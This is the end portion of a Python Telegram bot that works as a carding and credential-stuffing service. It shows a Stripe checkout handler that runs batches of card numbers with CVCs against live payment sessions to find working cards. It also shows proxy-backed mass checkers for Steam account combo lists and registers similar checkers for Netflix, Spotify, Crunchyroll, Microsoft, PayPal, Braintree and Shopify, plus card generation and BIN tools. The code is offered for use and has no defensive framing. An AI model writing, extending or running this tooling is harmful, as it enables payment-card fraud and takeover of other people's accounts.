                         InlineKeyboardButton(f"⏳ Left: {left_count}", callback_data="null")]
                    ]
                    reply_markup = InlineKeyboardMarkup(keyboard)
                    
                    try:
                        await status_msg.edit_text(
                            f"⚡ 𝗠𝗔𝗦𝗦 𝗦𝗧𝗘𝗔𝗠 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚\n"
                            f"━━━━━━━━━━━━━━━━━━━━━\n"
                            f"📊 Total Accounts: {total_combos}\n"
                            f"⚙️ Workers: {workers}\n"
                            f"🔄 Status: Checking #{checked_count}...",
                            reply_markup=reply_markup
                        )
                    except:
                        pass
                        
            except Exception as e:
                failed_count += 1
                checked_count += 1
                logger.error(f"Steam mass check error: {e}")
    
    keyboard = [
        [InlineKeyboardButton(f"✅ Hits: {hits_count}", callback_data="null"),
         InlineKeyboardButton(f"❌ Failed: {failed_count}", callback_data="null")],
        [InlineKeyboardButton(f"🔄 Checked: {checked_count}/{total_combos}", callback_data="null"),
         InlineKeyboardButton(f"⏳ Left: 0", callback_data="null")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    success_rate = round((hits_count/total_combos)*100, 1) if total_combos > 0 else 0
    
    await status_msg.edit_text(
        f"✅ 𝗠𝗔𝗦𝗦 𝗦𝗧𝗘𝗔𝗠 𝗖𝗛𝗘𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 Total: {total_combos} | ✅ Hits: {hits_count} | ❌ Failed: {failed_count}\n"
        f"🎯 Success Rate: {success_rate}%",
        reply_markup=reply_markup
    )


async def psta_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add proxy for Steam checker - /psta proxy_string"""
    user_id = update.effective_user.id
    
    if not is_registered(user_id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if not context.args:
        current_proxy = STEAM_GLOBAL_SETTINGS.get('proxy', 'None')
        await update.message.reply_text(
            "╔═══════════════════════════════╗\n"
            "   🔌 𝗦𝗧𝗘𝗔𝗠 𝗣𝗥𝗢𝗫𝗬 𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦\n"
            "╚═══════════════════════════════╝\n\n"
            f"📍 Current Proxy: {current_proxy}\n\n"
            "📝 Usage: /psta <proxy>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "Supported Formats:\n"
            "• http://ip:port\n"
            "• https://ip:port\n"
            "• socks4://ip:port\n"
            "• socks5://ip:port\n"
            "• socks5://user:pass@ip:port\n"
            "• ip:port:user:pass\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "💡 Use /rpsta to remove proxy",
            parse_mode='Markdown'
        )
        return
    
    proxy = ' '.join(context.args)
    
    if not proxy.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        parts = proxy.split(':')
        if len(parts) == 2:
            proxy = f"http://{proxy}"
        elif len(parts) == 4:
            proxy = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    
    STEAM_GLOBAL_SETTINGS['proxy'] = proxy
    
    await update.message.reply_text(
        "╔═══════════════════════════════╗\n"
        "   ✅ 𝗣𝗥𝗢𝗫𝗬 𝗦𝗘𝗧 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬\n"
        "╚═══════════════════════════════╝\n\n"
        f"🔌 Proxy: `{proxy}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "✅ Steam checker will now use this proxy\n"
        "💡 Use /rpsta to remove proxy",
        parse_mode='Markdown'
    )


async def rpsta_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove proxy for Steam checker - /rpsta"""
    user_id = update.effective_user.id
    
    if not is_registered(user_id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if STEAM_GLOBAL_SETTINGS.get('proxy'):
        old_proxy = STEAM_GLOBAL_SETTINGS['proxy']
        STEAM_GLOBAL_SETTINGS['proxy'] = None
        
        await update.message.reply_text(
            "╔═══════════════════════════════╗\n"
            "   ✅ 𝗣𝗥𝗢𝗫𝗬 𝗥𝗘𝗠𝗢𝗩𝗘𝗗\n"
            "╚═══════════════════════════════╝\n\n"
            f"🗑️ Removed: `{old_proxy}`\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "✅ Steam checker will now use direct connection",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            "╔═══════════════════════════════╗\n"
            "   ℹ️ 𝗡𝗢 𝗣𝗥𝗢𝗫𝗬 𝗦𝗘𝗧\n"
            "╚═══════════════════════════════╝\n\n"
            "❌ No proxy is currently set for Steam checker.\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "💡 Use /psta <proxy> to add one",
            parse_mode='Markdown'
        )


async def cs_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start checkout session process - /cs url"""
    user_id = update.effective_user.id
    if not is_registered(user_id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return ConversationHandler.END

    if not context.args:
        await update.message.reply_text("📝 Usage: /cs <stripe_checkout_url>\nExample: `/cs https://checkout.stripe.com/c/pay/cs_live...`", parse_mode='Markdown')
        return ConversationHandler.END

    url = context.args[0]
    processor = StripeCheckoutProcessor()
    
    # Extract PK and CS
    pk, cs = processor.extract_from_api(url)
    if not pk or not cs:
        # Fallback to manual extraction
        if not processor.manual_extract_from_url(url):
            await update.message.reply_text("❌ Failed to extract PK/CS from the provided URL.")
            return ConversationHandler.END
        pk, cs = processor.pk, processor.cs

    context.user_data['cs_processor'] = processor
    await update.message.reply_text(
        f"✅ **Checkout Session Extracted**\n"
        f"🔑 PK: `{pk[:20]}...`\n"
        f"🔐 CS: `{cs[:20]}...`\n\n"
        f"📥 Please send the CC details (Max 25).\n"
        f"Format: `number|mm|yyyy|cvc like this 5522135004940781|08|2028|317                     if year like yy then it will not work`",
        parse_mode='Markdown'
    )
    return AWAITING_CS_CC

async def receive_cs_cc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process CC details for the checkout session"""
    processor = context.user_data.get('cs_processor')
    if not processor:
        await update.message.reply_text("❌ Session expired. Please start again with /cs")
        return ConversationHandler.END

    text = update.message.text
    cards = []
    lines = text.strip().split('\n')
    for line in lines:
        if '|' in line:
            parts = line.split('|')
            if len(parts) >= 4:
                cards.append(line.strip())

    if not cards:
        await update.message.reply_text("❌ No valid cards found. Please send in format: `number|mm|year|cvc`", parse_mode='Markdown')
        return AWAITING_CS_CC

    if len(cards) > 25:
        await update.message.reply_text("⚠️ Maximum 25 cards allowed at once. Processing the first 25.")
        cards = cards[:25]

    status_msg = await update.message.reply_text(f"⏳ **Processing Cards...**\n━━━━━━━━━━━━━━━━━━━━\n📊 Total: {len(cards)}\n🔄 Checked: 0\n⏳ Left: {len(cards)}", parse_mode='Markdown')
    
    results = []
    checked_count = 0
    for card_str in cards:
        parts = card_str.split('|')
        cc_details = {
            'number': parts[0].strip().replace(' ', ''),
            'exp_month': parts[1].strip().zfill(2),
            'exp_year': parts[2].strip() if len(parts[2].strip()) == 4 else '20' + parts[2].strip(),
            'cvc': parts[3].strip()
        }
        
        try:
            loop = asyncio.get_event_loop()
            pm_resp = await loop.run_in_executor(None, processor.make_request_1, cc_details)
            if pm_resp and 'id' in pm_resp:
                if 'expected_amount' not in processor.extracted_values:
                    processor.extracted_values['expected_amount'] = "100"
                
                final_resp = await loop.run_in_executor(None, processor.make_request_2, pm_resp['id'])
                
                if final_resp.get('status') == 'succeeded':
                    results.append(f"✅ `{card_str}` - SUCCESS")
                else:
                    err = final_resp.get('error', {}).get('message', 'Failed')
                    results.append(f"❌ `{card_str}` - {err}")
            else:
                results.append(f"❌ `{card_str}` - Failed to create payment method")
        except Exception as e:
            results.append(f"❌ `{card_str}` - Error: {str(e)}")

        checked_count += 1
        left_count = len(cards) - checked_count
        if checked_count % 2 == 0 or checked_count == len(cards):
            try:
                await status_msg.edit_text(
                    f"⏳ **Processing Cards...**\n━━━━━━━━━━━━━━━━━━━━\n📊 Total: {len(cards)}\n🔄 Checked: {checked_count}\n⏳ Left: {left_count}",
                    parse_mode='Markdown'
                )
            except:
                pass

    final_results = "\n".join(results)
    await status_msg.edit_text(f"✅ **Processing Complete!**\n━━━━━━━━━━━━━━━━━━━━\n{final_results}", parse_mode='Markdown')
    return ConversationHandler.END

async def pcs_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set proxy for CS - Admin only"""
    user_id = update.effective_user.id
    username = update.effective_user.username
    if not is_admin(user_id, username):
        await update.message.reply_text("❌ Admin only command.")
        return

    if not context.args:
        current = CS_GLOBAL_SETTINGS['proxy'] or "None"
        await update.message.reply_text(f"📝 Usage: /pcs <proxy>\nCurrent: `{current}`", parse_mode='Markdown')
        return

    proxy = context.args[0]
    CS_GLOBAL_SETTINGS['proxy'] = proxy
    await update.message.reply_text(f"✅ CS Proxy set to: `{proxy}`", parse_mode='Markdown')

async def cancel_cs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Operation cancelled.")
    return ConversationHandler.END


async def mass_check_steam_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass check Steam accounts from file"""
    if not update.message.reply_to_message:
        return
    
    reply_to_id = update.message.reply_to_message.message_id
    
    file_info = None
    if 'cc_file' in context.user_data and context.user_data['cc_file'].get('message_id') == reply_to_id:
        file_info = context.user_data['cc_file']
    
    if update.message.reply_to_message.document:
        document = update.message.reply_to_message.document
        if document.file_name and document.file_name.endswith('.txt'):
            file_info = {
                'file_id': document.file_id,
                'file_name': document.file_name,
                'message_id': reply_to_id
            }
    
    if file_info:
        try:
            file = await context.bot.get_file(file_info['file_id'])
            file_content = await file.download_as_bytearray()
            text_content = file_content.decode('utf-8', errors='ignore')
            lines = text_content.strip().split('\n')
            combos = [line.strip() for line in lines if ':' in line and line.strip()]
            
            if combos:
                context.args = combos
                await msta_command(update, context)
                return
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {e}")
            return
    
    if update.message.reply_to_message.text:
        text = update.message.reply_to_message.text
        lines = text.strip().split('\n')
        combos = [line.strip() for line in lines if ':' in line and line.strip()]
        
        if combos:
            context.args = combos
            await msta_command(update, context)
            return
    
    raise ApplicationHandlerStop


def main():
    application = Application.builder().token(BOT_TOKEN).concurrent_updates(True).build()
    
    auth_handler = ConversationHandler(
        entry_points=[CommandHandler('setauth', setauth_command)],
        states={
            AWAITING_AUTH_MODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_auth_mode)],
            AWAITING_CREDENTIALS: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_credentials)],
        },
        fallbacks=[CommandHandler('cancel', stripe_cancel)],
    )
    
    braintree_url_handler = ConversationHandler(
        entry_points=[CommandHandler('setburl', braintree_setburl)],
        states={
            BRAINTREE_AWAITING_AUTH_MODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, braintree_receive_auth_mode)],
            BRAINTREE_AWAITING_CREDENTIALS: [MessageHandler(filters.TEXT & ~filters.COMMAND, braintree_receive_credentials)],
        },
        fallbacks=[CommandHandler('cancel', cancel_braintree)],
    )
    
    addgroup_handler = ConversationHandler(
        entry_points=[CommandHandler('addgroup', addgroup_start)],
        states={
            WAITING_GROUP_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_group_link)],
            WAITING_GROUP_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_group_id)],
        },
        fallbacks=[CommandHandler('cancel', cancel_addgroup)],
    )
    
    gbin_handler = ConversationHandler(
        entry_points=[CommandHandler('gbin', gbin_start)],
        states={
            GBIN_WAITING_TYPE: [MessageHandler(filters.TEXT & ~filters.COMMAND, gbin_receive_type)],
            GBIN_WAITING_DIGITS: [MessageHandler(filters.TEXT & ~filters.COMMAND, gbin_receive_digits)],
        },
        fallbacks=[CommandHandler('cancel', cancel_gbin)],
    )
    
    microsoft_handler = ConversationHandler(
        entry_points=[CommandHandler('mss', check_microsoft_mass)],
        states={
            MS_WAITING_ACCOUNTS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_microsoft_accounts),
                MessageHandler(filters.Document.ALL, receive_microsoft_accounts),
            ],
        },
        fallbacks=[CommandHandler('cancel', cancel_microsoft)],
    )
    
    # Add reply handler for /mss command (must be before the conversation handler)
    mss_reply_handler = MessageHandler(
        filters.REPLY & filters.COMMAND & filters.Regex(r'^/mss'),
        mass_check_microsoft_file
    )
    
    crunchyroll_handler = ConversationHandler(
        entry_points=[CommandHandler('mcr', check_crunchyroll_mass)],
        states={
            CR_WAITING_ACCOUNTS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_crunchyroll_accounts),
                MessageHandler(filters.Document.ALL, receive_crunchyroll_accounts),
            ],
        },
        fallbacks=[CommandHandler('cancel', cancel_crunchyroll)],
    )
    
    netflix_handler = ConversationHandler(
        entry_points=[CommandHandler('mnet', check_netflix_mass)],
        states={
            NETFLIX_WAITING_ACCOUNTS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_netflix_accounts),
                MessageHandler(filters.Document.ALL, receive_netflix_accounts),
            ],
        },
        fallbacks=[CommandHandler('cancel', cancel_netflix)],
    )
    
    mnet_reply_handler = MessageHandler(
        filters.REPLY & filters.COMMAND & filters.Regex(r'^/mnet'),
        mass_check_netflix_file
    )
    
    spotify_handler = ConversationHandler(
        entry_points=[CommandHandler('msp', check_spotify_mass)],
        states={
            SPOTIFY_WAITING_ACCOUNTS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_spotify_accounts),
                MessageHandler(filters.Document.ALL, receive_spotify_accounts),
            ],
        },
        fallbacks=[CommandHandler('cancel', cancel_spotify)],
    )
    
    msp_reply_handler = MessageHandler(
        filters.REPLY & filters.COMMAND & filters.Regex(r'^/msp'),
        mass_check_spotify_file
    )
    
    cr_api_handler = ConversationHandler(
        entry_points=[CommandHandler('mca', check_crunchyroll_api_mass)],
        states={
            CR_API_WAITING_ACCOUNTS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_crunchyroll_api_accounts),
                MessageHandler(filters.Document.ALL, receive_crunchyroll_api_accounts),
            ],
        },
        fallbacks=[CommandHandler('cancel', cancel_crunchyroll_api)],
    )
    # Use TypeHandler to catch ALL updates (messages, callbacks, etc.)
    from telegram.ext import TypeHandler
    application.add_handler(TypeHandler(Update, enforce_access_control), group=-1)

    # Shopify Auto Site Commands
    application.add_handler(CommandHandler("sx", sx_command))
    application.add_handler(CommandHandler("msx", msx_command))
    application.add_handler(CommandHandler("mssx", mssx_command))
    application.add_handler(CommandHandler("addsx", addsx_command))
    application.add_handler(CommandHandler("addpp", addpp_command))

    # Stripe Checkout Handler
    cs_handler = ConversationHandler(
        entry_points=[CommandHandler('cs', cs_command)],
        states={
            AWAITING_CS_CC: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_cs_cc)],
        },
        fallbacks=[CommandHandler('cancel', cancel_cs)],
    )
    application.add_handler(cs_handler)
    application.add_handler(CommandHandler('pcs', pcs_command))

    # Core Commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("register", register))
    application.add_handler(CommandHandler("cmd", cmd))
    application.add_handler(CommandHandler("cmds", cmd))
    application.add_handler(CallbackQueryHandler(button_callback))

    # Remove redundant handlers if they exist
    application.add_handler(CommandHandler("bin", bin_check))
    application.add_handler(CommandHandler("mbin", mbin_check))
    application.add_handler(CommandHandler("vbv", vbv_command))
    application.add_handler(CommandHandler("gen", gen_card))
    application.add_handler(CommandHandler("fake", fake_command))
    application.add_handler(CommandHandler("sk", sk_command))
    application.add_handler(CommandHandler("me", me_info))
    application.add_handler(CommandHandler("info", info_cmd))
    application.add_handler(CommandHandler("clean", clean_file))
    application.add_handler(CommandHandler("split", split_file))
    application.add_handler(CommandHandler("chk", check_stripe))
    application.add_handler(MessageHandler(filters.REPLY & filters.COMMAND & filters.Regex(r'^/mchk'), mass_check_stripe_file))
    application.add_handler(CommandHandler("mchk", check_stripe_mass))
    application.add_handler(CommandHandler("setsurl", setsurl_command))
    application.add_handler(CommandHandler("sh", check_shopify))
    application.add_handler(MessageHandler(filters.REPLY & filters.COMMAND & filters.Regex(r'^/msh'), mass_check_shopify_file))
    application.add_handler(CommandHandler("msh", check_shopify_mass))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(CommandHandler("seturl", shopify_seturl))
    application.add_handler(CommandHandler("myurl", shopify_myurl))
    application.add_handler(CommandHandler("rmurl", shopify_rmurl))
    application.add_handler(CommandHandler("addp", shopify_addp))
    application.add_handler(CommandHandler("rp", shopify_rp))
    application.add_handler(CommandHandler("lp", shopify_lp))
    application.add_handler(CommandHandler("cp", shopify_cp))
    application.add_handler(CommandHandler("chkurl", shopify_chkurl))
    application.add_handler(CommandHandler("mchku", shopify_mchku))
    application.add_handler(CommandHandler("br", check_braintree))
    application.add_handler(braintree_url_handler)
    application.add_handler(CommandHandler("myburl", braintree_myburl))
    application.add_handler(CommandHandler("rmburl", braintree_rmburl))
    application.add_handler(CommandHandler("baddp", braintree_baddp))
    application.add_handler(CommandHandler("brp", braintree_brp))
    application.add_handler(CommandHandler("blp", braintree_blp))
    application.add_handler(CommandHandler("bcp", braintree_bcp))
    application.add_handler(CommandHandler("chkburl", braintree_chkburl))
    application.add_handler(CommandHandler("mbchku", braintree_mbchku))
    application.add_handler(CommandHandler("pp", check_paypal))
    application.add_handler(CommandHandler("paypal", check_paypal))
    application.add_handler(CommandHandler("mpp", check_paypal_mass))
    application.add_handler(CommandHandler("mpaypal", check_paypal_mass))
    application.add_handler(CommandHandler("st", st_command))
    application.add_handler(CommandHandler("mst", mst_command))
    application.add_handler(MessageHandler(filters.REPLY & filters.COMMAND & filters.Regex(r'^/st$'), st_reply_handler))
    application.add_handler(MessageHandler(filters.REPLY & filters.COMMAND & filters.Regex(r'^/mst'), mst_file_handler))
    application.add_handler(CommandHandler("bt", bt_command))
    application.add_handler(CommandHandler("kill", kill_command))
    application.add_handler(CommandHandler("mbt", mbt_command))
    application.add_handler(MessageHandler(filters.REPLY & filters.COMMAND & filters.Regex(r'^/bt$'), bt_reply_handler))
    application.add_handler(MessageHandler(filters.REPLY & filters.COMMAND & filters.Regex(r'^/mbt'), mbt_file_handler))
    application.add_handler(CommandHandler("cr", check_crunchyroll))
    application.add_handler(crunchyroll_handler)
    application.add_handler(CommandHandler("ms", check_microsoft))
    application.add_handler(mss_reply_handler)
    application.add_handler(microsoft_handler)
    application.add_handler(CommandHandler("smp", set_ms_proxy))
    application.add_handler(CommandHandler("net", check_netflix))
    application.add_handler(mnet_reply_handler)
    application.add_handler(netflix_handler)
    application.add_handler(CommandHandler("pnet", set_netflix_proxy))
    application.add_handler(CommandHandler("nrp", remove_netflix_proxy))
    application.add_handler(CommandHandler("sp", check_spotify))
    application.add_handler(msp_reply_handler)
    application.add_handler(spotify_handler)
    application.add_handler(CommandHandler("psp", set_spotify_proxy))
    application.add_handler(CommandHandler("sprp", remove_spotify_proxy))
    application.add_handler(CommandHandler("ca", check_crunchyroll_api_single))
    application.add_handler(cr_api_handler)
    application.add_handler(CommandHandler("pca", set_crunchyroll_api_proxy))
    application.add_handler(CommandHandler("rpa", remove_crunchyroll_api_proxy))
    application.add_handler(CommandHandler("sta", sta_command))
    application.add_handler(MessageHandler(filters.REPLY & filters.COMMAND & filters.Regex(r'^/msta'), mass_check_steam_file))
    application.add_handler(CommandHandler("msta", msta_command))
    application.add_handler(CommandHandler("psta", psta_command))
    application.add_handler(CommandHandler("rpsta", rpsta_command))
    application.add_handler(CommandHandler("site", site_gate_analyze))
    application.add_handler(CommandHandler("msite", site_gate_mass))
    application.add_handler(CommandHandler("key", key_command))
    application.add_handler(CommandHandler("redeem", redeem_command))
    application.add_handler(CommandHandler("broadcast", broadcast_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("users", users_command))
    application.add_handler(CommandHandler("groups", groups_command))
    application.add_handler(CommandHandler("removegroup", removegroup_command))
    application.add_handler(CommandHandler("proxy", check_proxy_command))
    application.add_handler(CommandHandler("ban", ban_command))
    application.add_handler(CommandHandler("unban", unban_command))
    application.add_handler(CommandHandler("sban", sban_command))
    application.add_handler(CommandHandler("restart", restart_command))
    application.add_handler(CommandHandler("ping", ping_command))
    application.add_handler(CommandHandler("rmpre", rmpre_command))
    application.add_handler(CommandHandler("banlist", banned_list_command))
    application.add_handler(MessageHandler(filters.REPLY & filters.COMMAND & filters.Regex(r'^/sh$'), check_shopify_reply))
    application.add_handler(MessageHandler(filters.REPLY & filters.COMMAND & filters.Regex(r'^/chk$'), check_stripe_reply))
    application.add_handler(MessageHandler(filters.REPLY & filters.COMMAND & filters.Regex(r'^/br$'), check_braintree_reply))
    application.add_handler(MessageHandler(filters.REPLY & filters.COMMAND & filters.Regex(r'^/pp$'), check_paypal_reply))
    application.add_handler(auth_handler)
    application.add_handler(addgroup_handler)
    application.add_handler(gbin_handler)
    application.add_handler(CallbackQueryHandler(button_callback))
    
    logger.info("Bot started successfully!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
